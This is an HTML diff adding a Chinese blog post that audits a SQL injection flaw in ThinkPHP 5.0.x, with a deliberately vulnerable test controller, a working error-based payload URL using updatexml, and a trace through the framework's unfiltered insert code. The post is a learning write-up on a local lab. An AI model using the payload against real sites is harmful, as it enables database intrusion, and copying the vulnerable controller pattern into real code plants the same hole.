@@ -236,6 +236,268 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/15/ThinkPHP框架 5.0.x sql注入/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="P0rZ9">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="P0rZ9's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/09/15/ThinkPHP框架 5.0.x sql注入/" itemprop="url">代码审计 | ThinkPHP框架 5.0.x sql注入</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-15T08:15:41+08:00">
+                2018-09-15
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <blockquote>
+<p>笔者也是第一次审计Thinkphp框架,在结合网上视频跟Thinkphp5.0手册,完成了这次sql注入漏洞的审计,学习记录一波。</p>
+</blockquote>
+<hr>
+<p>##<strong>1.thinkphp基础知识:</strong></p>
+<p>thinkphp初始目录结构:</p>
+<blockquote>
+<pre><code>project  应用部署目录
+├─application           应用目录（可设置）
+│  ├─common             公共模块目录（可更改）
+│  ├─index              模块目录(可更改)
+│  │  ├─config.php      模块配置文件
+│  │  ├─common.php      模块函数文件
+│  │  ├─controller      控制器目录
+│  │  ├─model           模型目录
+│  │  ├─view            视图目录
+│  │  └─ ...            更多类库目录
+│  ├─command.php        命令行工具配置文件
+│  ├─common.php         应用公共（函数）文件
+│  ├─config.php         应用（公共）配置文件
+│  ├─database.php       数据库配置文件
+│  ├─tags.php           应用行为扩展定义文件
+│  └─route.php          路由配置文件
+├─extend                扩展类库目录（可定义）
+├─public                WEB 部署目录（对外访问目录）
+│  ├─static             静态资源存放目录(css,js,image)
+│  ├─index.php          应用入口文件
+│  ├─router.php         快速测试文件
+│  └─.htaccess          用于 apache 的重写
+├─runtime               应用的运行时目录（可写，可设置）
+├─vendor                第三方类库目录（Composer）
+├─thinkphp              框架系统目录
+│  ├─lang               语言包目录
+│  ├─library            框架核心类库目录
+│  │  ├─think           Think 类库包目录
+│  │  └─traits          系统 Traits 目录
+│  ├─tpl                系统模板目录
+│  ├─.htaccess          用于 apache 的重写
+│  ├─.travis.yml        CI 定义文件
+│  ├─base.php           基础定义文件
+│  ├─composer.json      composer 定义文件
+│  ├─console.php        控制台入口文件
+│  ├─convention.php     惯例配置文件
+│  ├─helper.php         助手函数文件（可选）
+│  ├─LICENSE.txt        授权说明文件
+│  ├─phpunit.xml        单元测试配置文件
+│  ├─README.md          README 文件
+│  └─start.php          框架引导文件
+├─build.php             自动生成定义文件（参考）
+├─composer.json         composer 定义文件
+├─LICENSE.txt           授权说明文件
+├─README.md             README 文件
+├─think                 命令行入口文件
+</code></pre></blockquote>
+<p>url访问:</p>
+<pre><code>127.0.0.1:83  /index.php   /Index       /index         /index
+域名          入口文件      前台      前台控制器    index方法
+</code></pre><p>助手函数<a href="https://www.kancloud.cn/manual/thinkphp5/118044" target="_blank" rel="noopener">input()</a>,专用来接收get，post等的值:<br><img src="http://static.zybuluo.com/chhyx/3sb6ttvy8bj5pf1o3wqj1am2/image_1cne0gl8i1jo21s7mj8l7qg1c0220.png" alt="image_1cne0gl8i1jo21s7mj8l7qg1c0220.png-59.1kB"></p>
+<p>##<strong>2.环境搭建:</strong><br>A.新建数据库tp,在数据库tp中新建user表,三个字段 分别为Id、name、pwd</p>
+<p><img src="http://static.zybuluo.com/chhyx/z5zg1yp93oq55yqa8s45vll1/image_1cne5r0511pvo1goqtra1ht6154s4a.png" alt="image_1cne5r0511pvo1goqtra1ht6154s4a.png-18.4kB"></p>
+<p>B.连接数据库并开启调试模式</p>
+<p><img src="http://static.zybuluo.com/chhyx/8n9knmbckzp29o159el9ez2a/image_1cne60jmug89t3puif13jb15cv4n.png" alt="image_1cne60jmug89t3puif13jb15cv4n.png-63.5kB"></p>
+<p>C.简单写一个insert功能,在<code>\application\index\controller\index.php</code><br>写入如下代码:</p>
+<pre><code>&lt;?php
+namespace app\index\controller;
+use think\Db;
+class Index
+{
+    public function user()
+    {
+        return &apos;aa&apos;;
+    }
+    public  function testsql()
+    {
+        $name = input(&apos;get.name/a&apos;);
+        db(&apos;user&apos;)-&gt;where([&apos;id&apos;=&gt; 1])-&gt;insert([&apos;name&apos;=&gt;$name]);
+    }
+}
+</code></pre><p>##<strong>2.漏洞利用:</strong><br>payload:</p>
+<pre><code>http://127.0.0.1:82/index.php/index/index/testsql?name[0]=inc&amp;name[1]=updatexml(1,concat(0x7,user(),0x7e),1)&amp;name[2]=1
+</code></pre><p><img src="http://static.zybuluo.com/chhyx/s4z4s0daqfnvxf1m3mhysq4p/image_1cne0ak8fq3n1dapnnq18ttqe51j.png" alt="image_1cne0ak8fq3n1dapnnq18ttqe51j.png-71.4kB"></p>
+<p>##<strong>3.代码分析:</strong><br>跟进<code>insert()</code>方法：</p>
+<pre><code>#thinkphp\library\think\db\Query.php 2079行:
+    ......
+public function insert(array $data = [], $replace = false, $getLastInsID = false, $sequence = null)
+    {
+        // 分析查询表达式
+        $options = $this-&gt;parseExpress();
+        $data    = array_merge($options[&apos;data&apos;], $data);
+</code></pre><p>接着:</p>
+<pre><code>$sql = $this-&gt;builder-&gt;insert($data, $options, $replace);
+</code></pre><p>进入bulider.php的insert()方法:</p>
+<pre><code>#thinkphp\library\think\db\Builder.php  719行:
+public function insert(array $data, $options = [], $replace = false)
+{
+    // 分析并处理数据
+$data = $this-&gt;parseData($data, $options);
+</code></pre><p>进入parseDate()方法,相关变量的值已经写入注释:</p>
+<pre><code>#thinkphp\library\think\db\Builder.php  86行:
+protected function parseData($data, $options)
+        {
+            ...
+
+            foreach ($data as $key =&gt; $val) {
+            //$key:name
+            //$val:{&apos;inc&apos;,&apos;updatexml(1,concat(0x7,user(),0x7e),1)&apos;,&apos;1&apos;} 
+               ...
+                if (false === strpos($key, &apos;.&apos;) &amp;&amp; !in_array($key, $fields, true)) {
+                        ...
+                } elseif (is_null($val)) {
+                   ...
+                } elseif (is_array($val) &amp;&amp; !empty($val)) {
+                    switch ($val[0]) {  #$val[1]:updatexml(1,concat(0x7,user(),0x7e),1)  val[2]:1
+                        case &apos;exp&apos;:
+                            $result[$item] = $val[1];
+                            break;
+                        case &apos;inc&apos;:
+                            $result[$item] = $this-&gt;parseKey($val[1]) . &apos;+&apos; . floatval($val[2]);
+                            break;
+                        case &apos;dec&apos;:
+                            $result[$item] = $this-&gt;parseKey($val[1]) . &apos;-&apos; . floatval($val[2]);
+                            break;
+                    }
+                } 
+            ...
+            return $result;  #`name`:updatexml(1,concat(0x7,user(),0x7e),1)+1
+        }
+</code></pre><p>我们可看出<code>$val</code>是一个数组,且<code>$val[0]==&#39;inc&#39;</code>,进入对应的switch语句:</p>
+<pre><code>case &apos;inc&apos;:
+    $result[$item] = $this-&gt;parseKey($val[1]) . &apos;+&apos; . floatval($val[2]);
+    break;
+</code></pre><p>对<code>$val[1]</code>也就是<code>updatexml(1,concat(0x7,user(),0x7e),1)</code>进行<code>parsekey()</code>方法的处理,但是并没有什么过滤,原样输出:</p>
+<pre><code>    protected function parseKey($key, $options = [])
+{
+    return $key;//$key：updatexml(1,concat(0x7,user(),0x7e),1)
+}
+</code></pre><p>而<code>floatval($val[2])</code>的结果为1<br>所以我们最后返回到<code>Query.php</code>的<code>insert()</code>方法执行的sql语句是:</p>
+<p><img src="http://static.zybuluo.com/chhyx/okk46bobgycn159pb8a1pbdn/image_1cne41cqcfq1djq1lei18d65173t.png" alt="image_1cne41cqcfq1djq1lei18d65173t.png-114.8kB"></p>
+<p>SQL注入成功。</p>
+<p>另一处的update()造成的注入与这个类似,这里就不再赘述了。小伙伴们如果想复现的话,只需改index.php文件insert为update即可。</p>
+<hr>
+<p>1.搭建thinkphp遇到个坑:<br>在保存index.php后 url查看，发现提示命名空间必须在首行:<br><img src="http://static.zybuluo.com/chhyx/wroy49bujchf58dmq6s8f477/image_1cndv2tcvafm1erc6vj19vp148r16.png" alt="image_1cndv2tcvafm1erc6vj19vp148r16.png-37.3kB"></p>
+<p>填坑:<br>用记事本打开相关文件,在保存时选择ANSI编码即可解决<br><img src="http://static.zybuluo.com/chhyx/c21h6hvf69psufq1uk5jeat0/image_1cndv1f2v1ol81a3km1j1i21l4vp.png" alt="image_1cndv1f2v1ol81a3km1j1i21l4vp.png-56.6kB"></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/14/preg_replace函数与命令执行/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1468,7 +1730,7 @@ alert(1);  执行的js代码
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">27</span>
+                  <span class="site-state-item-count">28</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
